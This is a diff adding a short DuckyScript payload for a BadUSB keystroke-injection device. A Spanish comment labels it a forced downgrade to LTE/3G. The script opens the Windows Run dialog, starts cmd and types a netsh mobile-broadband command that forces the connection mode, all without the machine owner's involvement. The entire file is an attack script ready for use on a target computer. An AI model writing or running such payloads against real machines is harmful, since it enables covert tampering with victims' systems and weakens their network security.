@@ -1,0 +1,5 @@
+# Fuerza downgrade a LTE/3G (BadUSB)
+DELAY 5000
+GUI r
+STRING cmd /K "netsh mbn set conmode force=lte"
+ENTER
